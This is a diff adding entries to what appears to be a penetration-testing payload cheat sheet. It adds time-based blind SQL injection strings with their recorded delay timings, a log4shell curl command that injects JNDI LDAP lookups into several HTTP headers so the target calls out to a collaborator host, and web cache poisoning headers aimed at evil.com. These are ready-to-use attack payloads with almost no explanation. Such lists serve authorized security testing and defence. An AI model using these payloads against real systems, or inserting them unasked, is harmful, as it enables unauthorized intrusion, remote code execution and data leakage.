@@ -15,6 +15,33 @@ User-Agent SQL Injection
 ```
 
 ```
+```
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332
+0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z => 10.740
+0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z => 2.714
+0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z => 1.927
+```
+
+log4shell
+```
+curl --http1.1 --silent --output /dev/null \
+--header 'User-agent: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
+--header 'X-Forwarded-For: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
+--header 'Referer: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
+```
+
+Web Cache Poisoning
+```
+X-Forwarded-Host: evil.com`  
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+```
+
 
 MarkDown
 ```
